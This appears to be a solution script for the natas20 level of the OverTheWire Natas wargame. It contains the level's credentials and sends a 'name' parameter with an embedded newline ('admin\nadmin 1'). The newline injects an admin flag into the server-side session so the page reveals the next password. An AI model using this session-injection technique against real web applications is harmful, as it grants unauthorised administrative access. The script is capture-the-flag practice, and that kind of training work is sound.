import requests

username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = "http://%s.natas.labs.overthewire.org" % username


params = {
    'name': 'admin\nadmin 1'
}

s = requests.Session()
r = s.get(url, params=params, auth=(username,password))
r = s.get(url, auth=(username,password))
print(r.text)